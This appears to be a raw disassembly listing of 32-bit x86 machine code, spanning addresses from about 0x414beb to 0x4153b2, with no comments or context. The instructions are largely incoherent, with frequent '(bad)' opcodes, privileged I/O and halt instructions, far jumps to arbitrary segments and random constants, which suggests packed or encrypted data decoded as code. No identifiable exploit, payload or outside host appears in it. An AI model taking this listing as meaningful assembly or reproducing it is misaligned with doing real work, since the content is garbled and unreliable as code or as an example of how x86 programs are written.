  414beb:	xor    eax,0xa8743609
  414bf0:	outs   dx,BYTE PTR ds:[esi]
  414bf1:	jmp    0x6b3d4d14
  414bf6:	mov    dh,0x1e
  414bf8:	out    0xb5,al
  414bfa:	ins    BYTE PTR es:[edi],dx
  414bfb:	es pop ebp
  414bfd:	mov    bl,0xec
  414bff:	mov    eax,ds:0x8eb9db5d
  414c04:	rcl    DWORD PTR [esi+ebp*1-0x2b],1
  414c08:	aaa    
  414c09:	adc    dl,BYTE PTR [ebx-0x3ffe024f]
  414c0f:	nop
  414c10:	xchg   ebp,eax
  414c11:	push   es
  414c12:	(bad)  
  414c13:	(bad)  
  414c14:	(bad)  
  414c15:	cmp    BYTE PTR [eax+0x10ea2869],dh
  414c1b:	inc    esi
  414c1c:	imul   edi,DWORD PTR [edi],0x18063dd1
  414c22:	sbb    al,0xbd
  414c24:	xor    bh,dl
  414c26:	or     eax,0x3854ab29
  414c2b:	out    dx,eax
  414c2c:	pop    ss
  414c2d:	loope  0x414c9b
  414c2f:	(bad)  
  414c30:	aad    0xc
  414c32:	xor    DWORD PTR [ecx-0x1fcbd0a9],eax
  414c38:	leave  
  414c39:	iret   
  414c3a:	push   0x6bbc8756
  414c3f:	push   ss
  414c40:	push   ecx
  414c41:	gs cli 
  414c43:	push   cs
  414c44:	adc    BYTE PTR [ecx+ebx*8],ah
  414c47:	sbb    al,0xaa
  414c49:	jp     0x414beb
  414c4b:	fldln2 
  414c4e:	add    ah,BYTE PTR [esi-0x3f0dfa52]
  414c54:	fsub   st(7),st
  414c56:	sub    eax,0xccbbdca5
  414c5b:	sbb    DWORD PTR [ebp+0x37],esp
  414c5e:	(bad)  
  414c5f:	out    0xf7,al
  414c61:	mov    DWORD PTR [esi-0x6e],edx
  414c64:	arpl   WORD PTR [esi],cx
  414c66:	push   ecx
  414c67:	mov    BYTE PTR [ebx-0x58],dl
  414c6a:	add    BYTE PTR [esi-0x27],dl
  414c6d:	cs daa 
  414c6f:	push   esi
  414c70:	loop   0x414c5b
  414c72:	pop    esi
  414c73:	pop    edi
  414c74:	fucomip st,st(0)
  414c76:	fnstcw WORD PTR [ecx]
  414c78:	push   0x3bf45060
  414c7d:	push   ebx
  414c7e:	or     esi,DWORD PTR [esi]
  414c80:	add    DWORD PTR [ebx+0x31],edx
  414c83:	xchg   esp,eax
  414c84:	loopne 0x414c14
  414c86:	lods   eax,DWORD PTR ds:[esi]
  414c87:	(bad)  
  414c88:	mov    al,ds:0x92e8b358
  414c8d:	ds add eax,0x9bea98f5
  414c93:	sub    eax,0x81089615
  414c98:	and    ch,BYTE PTR [eax-0x48]
  414c9b:	rcr    BYTE PTR [ecx+0xe],1
  414c9e:	xor    eax,0x310dc289
  414ca3:	test   eax,0x699f5a51
  414ca8:	lahf   
  414ca9:	mov    eax,ds:0x8af8c97
  414cae:	pop    ebp
  414caf:	pop    ebp
  414cb0:	mov    cl,0x4f
  414cb2:	jmp    0xb2b8:0x10beb1a
  414cb9:	mov    eax,ds:0x27054c4e
  414cbe:	div    DWORD PTR [edx+0x4b6b8f7]
  414cc4:	or     dh,BYTE PTR [edi]
  414cc6:	cmp    ebp,DWORD PTR [edi]
  414cc8:	xor    esi,DWORD PTR [ecx+0x12515b35]
  414cce:	outs   dx,DWORD PTR ds:[esi]
  414ccf:	lods   al,BYTE PTR ds:[esi]
  414cd0:	hlt    
  414cd1:	pop    ebp
  414cd2:	fucompp 
  414cd4:	inc    eax
  414cd5:	sub    eax,0x5a7604b5
  414cda:	hlt    
  414cdb:	dec    edi
  414cdc:	cs call 0x2e0358
  414ce2:	loopne 0x414cf1
  414ce4:	in     al,0x2b
  414ce6:	xor    BYTE PTR [eax-0x10],al
  414ce9:	les    sp,DWORD PTR [ebp-0x3]
  414ced:	adc    BYTE PTR [ebx],al
  414cef:	push   cs
  414cf0:	cwde   
  414cf1:	test   ch,bl
  414cf3:	inc    edi
  414cf4:	cmp    ebp,ebx
  414cf6:	pusha  
  414cf7:	popa   
  414cf8:	cmp    edx,0xffffffd3
  414cfb:	test   eax,0x2de8e530
  414d00:	xchg   ebx,eax
  414d01:	les    ebp,FWORD PTR [eax]
  414d03:	sbb    ecx,ecx
  414d05:	out    dx,al
  414d06:	shr    DWORD PTR ds:0x471a731d,cl
  414d0c:	shr    edi,1
  414d0e:	mov    BYTE PTR [ebx+0x4e99ef89],ah
  414d14:	loope  0x414cda
  414d16:	jecxz  0x414d2a
  414d18:	fsub   st,st(0)
  414d1a:	pop    eax
  414d1b:	leave  
  414d1c:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  414d1e:	pop    ds
  414d1f:	shl    DWORD PTR [ebp+0x8f530cd],cl
  414d25:	push   esp
  414d26:	(bad)  
  414d27:	fld    DWORD PTR [esp+ebx*8-0x369de84b]
  414d2e:	pop    ebx
  414d2f:	adc    esi,eax
  414d31:	jbe    0x414cd6
  414d33:	sahf   
  414d34:	jle    0x414d54
  414d36:	repnz mov eax,0xf4028cb2
  414d3c:	iret   
  414d3d:	rsm    
  414d3f:	repnz test DWORD PTR [eax+ebx*8],0xb9fd5ccb
  414d47:	jle    0x414ced
  414d49:	sbb    ah,BYTE PTR [ebp+0x60]
  414d4c:	sahf   
  414d4d:	and    al,0x73
  414d4f:	mov    bl,0x30
  414d51:	inc    eax
  414d52:	inc    ebp
  414d53:	retf   0xe1f3
  414d56:	and    BYTE PTR [edi],dl
  414d58:	lods   al,BYTE PTR ds:[esi]
  414d59:	popf   
  414d5a:	imul   esi,DWORD PTR [edi+0x69],0x68c31441
  414d61:	lock ret 
  414d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d64:	js     0x414d22
  414d66:	sbb    ch,BYTE PTR [eax]
  414d68:	push   0x4e
  414d6a:	xchg   ebx,eax
  414d6b:	adc    eax,0x4b66f813
  414d70:	push   esi
  414d71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d72:	fnstsw WORD PTR [edx]
  414d74:	cli    
  414d75:	shl    DWORD PTR [esi-0x9da126a],1
  414d7b:	dec    esi
  414d7c:	into   
  414d7d:	sub    BYTE PTR [edx+0x629cca3b],al
  414d83:	cli    
  414d84:	xchg   edi,eax
  414d85:	call   0x8994ae5f
  414d8a:	aam    0xb
  414d8c:	mov    ecx,0x322abc9a
  414d91:	push   ds
  414d92:	and    dl,BYTE PTR [edx+edx*4-0x7f4bd58c]
  414d99:	(bad)  
  414d9a:	out    dx,al
  414d9b:	mov    dl,0x9b
  414d9d:	push   ss
  414d9e:	sub    ch,dl
  414da0:	jle    0x414dc7
  414da2:	adc    BYTE PTR ds:0x9d0901f2,ah
  414da8:	pop    ss
  414da9:	mov    bl,0x40
  414dab:	inc    edx
  414dac:	fs test eax,0x8d86b4d0
  414db2:	shl    ah,0x34
  414db5:	iret   
  414db6:	pop    edi
  414db7:	jp     0x414d87
  414db9:	mov    ah,0x76
  414dbb:	sbb    eax,0x4d74baaa
  414dc0:	or     DWORD PTR [edx-0x70],edi
  414dc3:	je     0x414d89
  414dc5:	push   esp
  414dc6:	lods   al,BYTE PTR ds:[esi]
  414dc7:	sbb    dl,0x91
  414dca:	cmp    bl,BYTE PTR [eax-0x71037489]
  414dd0:	stos   BYTE PTR es:[edi],al
  414dd1:	jns    0x414e0c
  414dd3:	dec    eax
  414dd4:	out    dx,al
  414dd5:	xchg   ebp,eax
  414dd6:	sbb    eax,0x68169be6
  414ddb:	push   ecx
  414ddc:	in     al,0xb5
  414dde:	xor    eax,0xdfe64b7e
  414de3:	hlt    
  414de4:	jb     0x414d98
  414de6:	pop    ecx
  414de7:	inc    edi
  414de8:	mov    eax,ds:0xac725cb4
  414ded:	pop    esi
  414dee:	push   esp
  414def:	lds    ebx,FWORD PTR [edx+0x60608cd1]
  414df5:	test   al,cl
  414df7:	and    edx,DWORD PTR [ebp-0x2c]
  414dfa:	retf   
  414dfb:	mov    DWORD PTR [edx],0x81d0ab41
  414e01:	mov    esi,0x74571bbf
  414e06:	ds aaa 
  414e08:	icebp  
  414e09:	ja     0x414e66
  414e0b:	push   ebx
  414e0c:	add    eax,0x49e4cc68
  414e11:	and    DWORD PTR [ebp+ebx*1-0x16],edx
  414e15:	sbb    al,0x4f
  414e17:	ss icebp 
  414e19:	out    dx,al
  414e1a:	mov    ds:0xfec1a68,eax
  414e1f:	mov    dh,0xc6
  414e21:	inc    ebp
  414e22:	pushf  
  414e23:	xor    BYTE PTR [eax+0x58],ch
  414e26:	add    al,0x9d
  414e28:	packssdw mm5,QWORD PTR [eax]
  414e2b:	jmp    0x68d9:0xd9f5b726
  414e32:	sub    cl,bh
  414e34:	mov    dl,0xfa
  414e36:	jp     0x414dff
  414e38:	jns    0x414df8
  414e3a:	aad    0x3
  414e3c:	out    0x47,eax
  414e3e:	shld   eax,eax,0x2d
  414e42:	arpl   WORD PTR [eax-0x31a70c8b],bp
  414e48:	add    bl,bl
  414e4a:	inc    ebx
  414e4b:	mov    al,al
  414e4d:	clc    
  414e4e:	jmp    0xd20dee78
  414e53:	and    BYTE PTR [ecx+esi*1+0x4],ch
  414e57:	jmp    0x5311:0x20c153d4
  414e5e:	xchg   edi,eax
  414e5f:	dec    esp
  414e60:	div    BYTE PTR [edi]
  414e62:	push   ebp
  414e63:	ret    0x914b
  414e66:	jmp    0x414e04
  414e68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e69:	fwait
  414e6a:	add    ecx,edi
  414e6c:	clc    
  414e6d:	dec    ebx
  414e6e:	pop    edi
  414e6f:	pusha  
  414e70:	ret    0xce59
  414e73:	pop    es
  414e74:	adc    BYTE PTR [ecx-0x56],0x37
  414e78:	aam    0xb9
  414e7a:	cmp    BYTE PTR [esi-0x10c4f281],ah
  414e80:	leave  
  414e81:	loopne 0x414ea4
  414e83:	pop    ds
  414e84:	lock xor eax,0xcf7fb09b
  414e8a:	cmp    dh,BYTE PTR [ecx+0x6c]
  414e8d:	ret    0x54a7
  414e90:	push   ecx
  414e91:	add    bh,BYTE PTR [ecx-0x6ecc198a]
  414e97:	add    eax,0x28b9ac07
  414e9c:	fisttp QWORD PTR [edx-0x3110bd15]
  414ea2:	rcr    DWORD PTR [ecx-0x4b],1
  414ea5:	xchg   esp,eax
  414ea6:	ss test eax,0xd2840eb0
  414eac:	outs   dx,DWORD PTR ds:[esi]
  414ead:	mov    dl,0x55
  414eaf:	jnp    0x414ec1
  414eb1:	push   edx
  414eb2:	jne    0x414e49
  414eb4:	cmc    
  414eb5:	bound  esp,QWORD PTR [ebx-0x360ba99a]
  414ebb:	pop    ebp
  414ebc:	dec    ebx
  414ebd:	mov    ecx,0x1b5ad4e8
  414ec2:	and    ebp,DWORD PTR [ecx-0x3074421e]
  414ec8:	xor    ebx,eax
  414eca:	test   DWORD PTR [ebp-0x60],ecx
  414ecd:	adc    BYTE PTR [eax],ch
  414ecf:	mov    dl,BYTE PTR [ebp-0x28dd255e]
  414ed5:	mov    ch,BYTE PTR [edi-0x2c258751]
  414edb:	inc    eax
  414edc:	mov    al,0x35
  414ede:	mov    bh,0x4c
  414ee0:	sbb    al,0xd4
  414ee2:	pop    edi
  414ee3:	fnstcw WORD PTR [ecx-0x16]
  414ee6:	ss (bad) 
  414ee8:	fwait
  414ee9:	pop    ss
  414eea:	push   esp
  414eec:	xchg   BYTE PTR [ebx],cl
  414eee:	cld    
  414eef:	shl    BYTE PTR ds:0x217858c8,cl
  414ef5:	pushf  
  414ef6:	fnsave [ecx+0x40]
  414ef9:	mov    cl,0xd4
  414efb:	lock push esi
  414efd:	mov    esi,0x3222be61
  414f02:	loopne 0x414ece
  414f04:	push   cs
  414f05:	push   cs
  414f06:	push   ebp
  414f07:	mov    cl,0x49
  414f09:	lods   al,BYTE PTR ds:[esi]
  414f0a:	mov    ebx,DWORD PTR [ebx-0x6b]
  414f0d:	(bad)  
  414f0e:	or     ebx,ebx
  414f10:	or     eax,0x9925d439
  414f15:	sbb    eax,0xfb55ffed
  414f1a:	ror    DWORD PTR [eax],cl
  414f1c:	in     eax,dx
  414f1d:	xchg   edx,eax
  414f1e:	mov    eax,0x3e45bdbd
  414f23:	mov    al,ds:0x8e8452
  414f28:	test   al,0x7f
  414f2a:	xor    eax,0x54a2db3a
  414f2f:	cmp    DWORD PTR [ecx-0x53],ebx
  414f32:	mov    ds:0xa1175d1,eax
  414f37:	mov    gs,esi
  414f39:	aam    0x69
  414f3b:	mov    esi,DWORD PTR [eax-0x29]
  414f3e:	inc    edi
  414f3f:	adc    al,0xcb
  414f41:	mov    dh,0xb3
  414f43:	push   esi
  414f44:	pop    edx
  414f45:	mov    ds:0x372d64,al
  414f4a:	sub    al,0xb
  414f4d:	mov    BYTE PTR [ecx],0x5f
  414f50:	call   0xc294:0x9771b4b2
  414f57:	xchg   BYTE PTR [ecx+0x6],ch
  414f5a:	lods   eax,DWORD PTR ds:[esi]
  414f5b:	(bad)  
  414f5c:	stos   BYTE PTR es:[edi],al
  414f5d:	fistp  QWORD PTR [eax-0x42f32abe]
  414f63:	jmp    0x8ce0:0x93b848f1
  414f6a:	push   ecx
  414f6b:	jg     0x414f98
  414f6d:	push   cs
  414f6e:	shl    DWORD PTR [edx-0x2c],1
  414f71:	xlat   BYTE PTR ds:[ebx]
  414f72:	sub    BYTE PTR [esi],dl
  414f74:	mov    ebp,DWORD PTR [ebp+0x5f]
  414f77:	sbb    DWORD PTR [eax],0x7e4a8d4a
  414f7d:	push   edi
  414f7e:	test   al,0x5a
  414f80:	jl     0x414f88
  414f82:	inc    esp
  414f83:	les    edi,FWORD PTR [ebx+0x16]
  414f86:	das    
  414f87:	shl    BYTE PTR [ebx+edx*2+0x14b60246],1
  414f8e:	data16 xchg BYTE PTR ds:[ecx-0x6f9d250a],cl
  414f96:	xor    eax,0x77bad186
  414f9b:	repnz mov eax,ds:0xa912f790
  414fa1:	adc    bl,al
  414fa3:	rol    BYTE PTR [ebp-0x1a],1
  414fa6:	mov    ah,0x72
  414fa8:	cmc    
  414fa9:	stos   BYTE PTR es:[edi],al
  414faa:	mov    ecx,0xd21a4e03
  414faf:	cdq    
  414fb0:	cli    
  414fb1:	adc    al,0xbe
  414fb3:	sub    ebx,DWORD PTR [ecx]
  414fb5:	in     al,dx
  414fb6:	test   BYTE PTR [edi-0x4e],dh
  414fb9:	jno    0x414f8f
  414fbb:	in     eax,0x90
  414fbd:	inc    ebx
  414fbe:	inc    edi
  414fbf:	aad    0xd2
  414fc1:	stos   BYTE PTR es:[edi],al
  414fc2:	jne    0x414fc3
  414fc4:	cmp    bl,BYTE PTR [edx+0x4c14cf45]
  414fca:	pop    esi
  414fcb:	ins    DWORD PTR es:[di],dx
  414fcd:	xlat   BYTE PTR ds:[ebx]
  414fce:	daa    
  414fcf:	(bad)  
  414fd0:	out    0x98,eax
  414fd2:	les    edx,FWORD PTR [eax+ecx*2-0x63]
  414fd6:	xlat   BYTE PTR ds:[ebx]
  414fd7:	xor    ebx,ecx
  414fd9:	mov    ds:0x649e25fa,al
  414fde:	idiv   DWORD PTR [edx-0x48]
  414fe1:	jle    0x414fd9
  414fe3:	mov    ah,0x9f
  414fe5:	scas   eax,DWORD PTR es:[edi]
  414fe6:	jg     0x414f82
  414fe8:	enter  0x574b,0x7b
  414fec:	sbb    esp,esi
  414fee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fef:	push   0xffffffd8
  414ff1:	loope  0x414fa5
  414ff3:	jae    0x414f80
  414ff5:	jb     0x414f9f
  414ff7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ff8:	dec    eax
  414ff9:	shr    BYTE PTR [esi+0x5e],cl
  414ffc:	imul   edi,DWORD PTR [ebp-0x5a056e80],0x34
  415003:	pop    ds
  415004:	xchg   ebp,eax
  415005:	test   DWORD PTR [eax+0x57],esi
  415008:	mul    BYTE PTR [eax+0x20]
  41500b:	dec    esi
  41500c:	repz push edx
  41500e:	mov    esi,DWORD PTR [ecx+0x4a1f3e72]
  415014:	(bad)  
  415015:	loop   0x415010
  415017:	cmp    al,0x26
  415019:	jp     0x414fcd
  41501b:	cmp    edi,0xffffffd3
  41501e:	or     BYTE PTR [edi+ecx*1-0x19],bh
  415022:	mov    edi,0x83ab13f2
  415027:	xchg   edx,eax
  415028:	out    dx,al
  415029:	cdq    
  41502a:	out    0x77,eax
  41502c:	and    ch,0x86
  41502f:	inc    edx
  415030:	int    0x8a
  415032:	cmp    al,0x2a
  415034:	icebp  
  415035:	mov    bh,0x11
  415037:	push   ecx
  415038:	inc    esi
  415039:	out    0x7d,al
  41503b:	mov    eax,ds:0x17f78bf1
  415040:	and    BYTE PTR [eax],bh
  415042:	jo     0x4150ae
  415044:	and    ebx,eax
  415046:	pop    ebp
  415047:	or     cl,BYTE PTR [edi+0x1f]
  41504a:	push   es
  41504b:	adc    edx,DWORD PTR [ecx+eax*8]
  41504e:	sbb    dl,BYTE PTR fs:[ebp+0x776fd682]
  415055:	and    al,0x81
  415057:	xor    eax,0xb2202b5b
  41505c:	xchg   DWORD PTR [ecx],edx
  41505e:	push   0x3676b4e5
  415063:	shr    BYTE PTR [ebp+0x7de531d4],0x28
  41506a:	inc    ecx
  41506b:	in     al,dx
  41506c:	inc    ecx
  41506d:	mov    ecx,0x3901728
  415072:	lods   al,BYTE PTR ds:[esi]
  415073:	shr    BYTE PTR [eax-0xa6ad4c5],cl
  415079:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41507a:	out    dx,al
  41507b:	mov    ebx,0x733b83a2
  415080:	mov    ebp,0x9d0ceda7
  415085:	mov    ecx,0xf7fa2c31
  41508a:	jo     0x41502c
  41508c:	sbb    eax,0x27eea83d
  415091:	mov    edi,ebp
  415093:	xchg   BYTE PTR [ecx+0x18],al
  415096:	mov    edx,0xdd15bec3
  41509b:	add    ebp,ecx
  41509d:	inc    edx
  41509e:	jg     0x41502b
  4150a0:	dec    edx
  4150a1:	shr    cl,1
  4150a3:	je     0x4150ea
  4150a5:	sub    DWORD PTR [esi-0x62],ecx
  4150a8:	pop    esp
  4150a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150aa:	mov    bh,0x1e
  4150ac:	lods   al,BYTE PTR ds:[esi]
  4150ad:	test   al,0x3f
  4150af:	(bad)  
  4150b0:	shl    esp,cl
  4150b2:	fdivrp st(0),st
  4150b4:	test   eax,0xe36f8ed8
  4150b9:	addr16 int3 
  4150bb:	sbb    eax,0xcda8b797
  4150c0:	(bad)  
  4150c1:	and    bl,bl
  4150c3:	pop    esp
  4150c4:	pop    esi
  4150c5:	xlat   BYTE PTR ds:[ebx]
  4150c6:	(bad)  
  4150c7:	mov    ch,0x31
  4150c9:	ins    DWORD PTR es:[edi],dx
  4150ca:	loope  0x41510c
  4150cc:	stos   DWORD PTR es:[edi],eax
  4150cd:	repz cmp DWORD PTR [ecx+0x21],esp
  4150d1:	jno    0x415128
  4150d3:	cmp    al,0xe6
  4150d5:	push   ds
  4150d6:	xor    al,0x6f
  4150d8:	mov    dl,0xf4
  4150da:	aad    0x69
  4150dc:	sub    esp,DWORD PTR [edx-0x5fc51a74]
  4150e2:	(bad)  
  4150e3:	not    dh
  4150e5:	lds    esp,FWORD PTR [esp+ecx*8-0x55c8697a]
  4150ec:	xor    DWORD PTR [esi],0x65b0ae27
  4150f2:	div    DWORD PTR [edx+eax*2-0x1b519f17]
  4150f9:	pop    eax
  4150fa:	(bad)  
  4150fb:	clc    
  4150fc:	xor    dh,BYTE PTR [ebp+0x44]
  4150ff:	bound  eax,QWORD PTR [ebx+eax*8+0x4618446c]
  415106:	sub    eax,0x392acc7b
  41510b:	push   eax
  41510c:	cmp    BYTE PTR [ecx],0xe6
  41510f:	adc    BYTE PTR [ecx-0x3e1b9eb0],0x2f
  415116:	sbb    ah,BYTE PTR [esp+ecx*4-0x3432403e]
  41511d:	aam    0xf4
  41511f:	add    al,0x71
  415121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415122:	or     edi,edi
  415124:	pop    edx
  415125:	sbb    BYTE PTR [edi+0x16],ah
  415128:	jmp    0xe7b8:0x5eeb8d9f
  41512f:	mov    al,ds:0xe8a819b0
  415134:	lea    eax,[ebp-0x2a5eae4]
  41513a:	xor    ecx,DWORD PTR [ebp+edx*8+0x7b05ac14]
  415141:	xor    BYTE PTR [edx],cl
  415143:	cld    
  415144:	xor    BYTE PTR [edx],ch
  415146:	sub    esp,0x14b01184
  41514c:	xchg   ebp,eax
  41514d:	daa    
  41514e:	xchg   ecx,eax
  41514f:	adc    esi,DWORD PTR [eax-0x37121325]
  415155:	lods   al,BYTE PTR ds:[esi]
  415156:	test   BYTE PTR ds:0x71c578cd,cl
  41515c:	cmc    
  41515d:	sbb    al,0xcf
  41515f:	inc    edx
  415160:	jmp    0x12066e3
  415165:	lods   al,BYTE PTR ds:[esi]
  415166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415167:	in     eax,0x8
  415169:	push   DWORD PTR [esi+0x4b4000ac]
  41516f:	sbb    cl,BYTE PTR [ecx-0x41]
  415172:	test   BYTE PTR [ecx-0x5d9d171f],cl
  415178:	add    esp,eax
  41517a:	adc    edi,edx
  41517c:	and    ah,BYTE PTR [ecx]
  41517e:	loope  0x4151f8
  415180:	ret    0xe002
  415183:	sbb    al,0xc6
  415185:	std    
  415186:	add    eax,DWORD PTR [ebx]
  415188:	mov    edi,0x76233845
  41518d:	je     0x41519c
  41518f:	mov    ch,0x66
  415191:	push   ecx
  415192:	or     BYTE PTR [ecx],bh
  415194:	adc    edi,DWORD PTR [ecx]
  415196:	idiv   DWORD PTR [edx+eiz*2]
  415199:	stc    
  41519a:	or     dh,BYTE PTR [ebx-0x80]
  41519d:	inc    esi
  41519e:	mov    al,ds:0x5c790300
  4151a3:	jne    0x41519f
  4151a5:	lods   al,BYTE PTR ds:[esi]
  4151a6:	and    ax,0xb34f
  4151aa:	cmc    
  4151ab:	sub    ebx,DWORD PTR [eax+0x3]
  4151ae:	fiadd  WORD PTR [eax-0x10]
  4151b1:	jecxz  0x41522f
  4151b3:	shl    eax,1
  4151b5:	jge    0x4151b3
  4151b7:	nop
  4151b8:	ins    BYTE PTR es:[edi],dx
  4151b9:	dec    ebp
  4151ba:	sub    eax,0xb02d373a
  4151bf:	cmp    DWORD PTR [edi+0x7f5bfa91],edx
  4151c5:	and    eax,0x6e8d428a
  4151ca:	xchg   ebx,eax
  4151cb:	jo     0x415185
  4151cd:	or     eax,0xc4cd5f61
  4151d2:	fld    TBYTE PTR [ebx+0x6a]
  4151d5:	and    eax,0xfcd20b4
  4151da:	adc    bh,BYTE PTR [ecx]
  4151dc:	imul   esi,DWORD PTR [esp+ebx*8+0x2a],0xfffffffa
  4151e1:	inc    ebp
  4151e2:	rol    BYTE PTR [bp-0x92a],0x82
  4151e8:	sub    bl,ch
  4151ea:	stos   DWORD PTR es:[edi],eax
  4151eb:	ja     0x4151f9
  4151ed:	mov    ebp,0xcaf2b8a6
  4151f2:	push   edi
  4151f3:	mov    bl,0xff
  4151f5:	cmp    DWORD PTR [edx+edx*8],0x8689306b
  4151fc:	bound  esp,QWORD PTR [eax+0x4b6d0edb]
  415202:	inc    ebx
  415203:	sbb    BYTE PTR [eax+0x21],bl
  415206:	test   eax,0xff323b64
  41520b:	xor    BYTE PTR [edx+0x50f13250],bh
  415211:	xchg   esp,eax
  415212:	in     eax,dx
  415213:	xor    dh,ah
  415215:	aaa    
  415216:	inc    esp
  415217:	or     DWORD PTR [ebx-0x71c6f4fd],0xffffff80
  41521e:	pop    ds
  41521f:	sahf   
  415220:	lods   eax,DWORD PTR ds:[esi]
  415221:	jnp    0x4151ae
  415223:	aam    0x98
  415225:	jg     0x415210
  415227:	inc    edi
  415228:	rcr    BYTE PTR [eax+edi*4-0x7a50190e],0xdc
  415230:	jns    0x4151c7
  415232:	push   edi
  415233:	xchg   DWORD PTR [edi],ebp
  415235:	ret    0x46c0
  415238:	lods   eax,DWORD PTR ds:[esi]
  415239:	hlt    
  41523a:	in     eax,0xcf
  41523c:	mov    dh,BYTE PTR [ecx+eiz*2-0x48ab1d2]
  415243:	adc    BYTE PTR [ebp-0x47],0xef
  415247:	cwde   
  415248:	sub    BYTE PTR [edi],ch
  41524a:	ds pushf 
  41524c:	icebp  
  41524d:	das    
  41524e:	stos   DWORD PTR es:[edi],eax
  41524f:	jbe    0x4151f6
  415251:	imul   edx,DWORD PTR [ebx-0x79],0x4c
  415255:	gs push 0xc40d5419
  41525b:	sbb    eax,0xe9741875
  415260:	aaa    
  415261:	arpl   WORD PTR [ecx+0x1d],di
  415264:	or     eax,0xc1100d79
  415269:	fiadd  DWORD PTR [ebp+0x7db8588]
  41526f:	stos   BYTE PTR es:[edi],al
  415270:	jnp    0x41520b
  415272:	nop
  415273:	in     al,0x63
  415275:	push   ebp
  415276:	push   0x3ab0b8df
  41527b:	jg     0x415237
  41527d:	jmp    0x8efc:0x9e75493
  415284:	mov    ebx,esp
  415286:	or     ah,bh
  415288:	dec    ebx
  415289:	dec    ebp
  41528a:	sbb    DWORD PTR [edx+0x8],ebx
  41528d:	ja     0x41525e
  41528f:	outs   dx,BYTE PTR ds:[esi]
  415290:	pop    edx
  415291:	sahf   
  415292:	dec    edi
  415293:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415294:	fisttp QWORD PTR [edi]
  415296:	mov    ds:0x5442784c,eax
  41529b:	pop    edi
  41529c:	dec    BYTE PTR ds:0xd57e1460
  4152a2:	fdivr  DWORD PTR [ecx+0x226dd73c]
  4152a8:	jb     0x41527e
  4152aa:	jmp    0x2808:0x763a7d46
  4152b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152b2:	cmp    DWORD PTR [esi-0x5a8f6235],ebp
  4152b8:	jnp    0x4152c5
  4152ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152bb:	in     eax,0xe5
  4152bd:	aad    0x28
  4152bf:	sbb    al,0x3f
  4152c1:	or     ch,BYTE PTR [ecx*4+0x416143d]
  4152c8:	pop    esp
  4152c9:	xchg   ecx,eax
  4152ca:	stos   BYTE PTR es:[edi],al
  4152cb:	sbb    esp,ecx
  4152cd:	jns    0x4152e4
  4152cf:	mov    ?,WORD PTR [eax]
  4152d1:	push   ebp
  4152d2:	pop    esi
  4152d3:	out    0xfc,al
  4152d5:	add    eax,0x4e664b50
  4152da:	scas   al,BYTE PTR es:[edi]
  4152db:	sbb    DWORD PTR [edi],esi
  4152dd:	ins    DWORD PTR es:[edi],dx
  4152de:	retf   
  4152df:	mov    BYTE PTR [esi],ch
  4152e1:	cwde   
  4152e2:	enter  0x3db9,0xe2
  4152e6:	inc    edx
  4152e7:	imul   esp,DWORD PTR [edx-0x6],0xf9dea6d4
  4152ee:	bound  edi,QWORD PTR [edx-0x6456797f]
  4152f4:	fwait
  4152f5:	mov    ch,0x93
  4152f7:	jecxz  0x415315
  4152f9:	jb     0x41533b
  4152fb:	sub    BYTE PTR [edx+eax*8-0x6b180afc],cl
  415302:	out    dx,eax
  415303:	sahf   
  415304:	out    dx,eax
  415305:	js     0x415376
  415307:	jle    0x415361
  415309:	les    ebx,FWORD PTR [eax]
  41530b:	push   esp
  41530c:	jnp    0x4152f6
  41530e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41530f:	xchg   ebp,eax
  415310:	or     al,0x5c
  415312:	lahf   
  415313:	add    dl,BYTE PTR [ebp+eax*2-0x1eda4376]
  41531a:	es data16 cmc 
  41531d:	xchg   ebx,eax
  41531e:	ret    
  41531f:	dec    eax
  415320:	lods   eax,DWORD PTR ds:[esi]
  415321:	add    BYTE PTR [ebx],ah
  415323:	mov    cl,BYTE PTR [ecx]
  415325:	and    eax,0xaca3a40e
  41532a:	enter  0x3296,0x80
  41532e:	xor    bh,BYTE PTR [edi]
  415330:	jne    0x41533e
  415332:	inc    esi
  415333:	lods   al,BYTE PTR ds:[esi]
  415334:	int    0x35
  415336:	push   es
  415337:	push   0xfe21dca2
  41533c:	dec    ebx
  41533d:	pop    ebp
  41533e:	sar    BYTE PTR [edi],1
  415340:	enter  0xfdf1,0x7f
  415344:	loop   0x4153ab
  415346:	fnstenv [ebx+edx*8-0x401a6ee3]
  41534d:	call   0x7f86:0x48c9b430
  415354:	ins    BYTE PTR es:[edi],dx
  415355:	inc    ecx
  415356:	fcomp  QWORD PTR [ecx+0x2a2f9beb]
  41535c:	cmp    BYTE PTR [ebx],dh
  41535e:	fldenv [ecx+0x17b707c1]
  415364:	hlt    
  415365:	mov    esi,0xc3d3edce
  41536a:	and    DWORD PTR [esi-0x1f],0xffffffb3
  41536e:	add    edx,DWORD PTR [edi+0x2b]
  415371:	ins    DWORD PTR es:[edi],dx
  415372:	arpl   WORD PTR [ecx+0x3],bx
  415375:	mov    esi,0x8f2bad25
  41537a:	retf   
  41537b:	mov    WORD PTR [edx+0x63],cs
  41537e:	inc    ebp
  41537f:	sbb    DWORD PTR [ebx-0x19],ebx
  415382:	push   eax
  415383:	fmul   QWORD PTR ds:0xb015bc20
  415389:	pop    esp
  41538a:	sbb    al,0xe2
  41538c:	lea    ebx,[ebx+0x21]
  41538f:	fld    QWORD PTR [edx-0x70]
  415392:	mov    ds:0xc8a47c37,al
  415397:	add    BYTE PTR [ebp-0x3c3d2d2a],al
  41539d:	clc    
  41539e:	sub    BYTE PTR [ecx-0x741c9505],bl
  4153a4:	(bad)  
  4153a5:	mov    bh,0x18
  4153a7:	push   ebp
  4153a8:	xor    al,0xf8
  4153aa:	mov    esi,0x6c035769
  4153af:	lods   eax,DWORD PTR ds:[esi]
  4153b0:	mov    dh,0x66
  4153b2:	inc    ebx
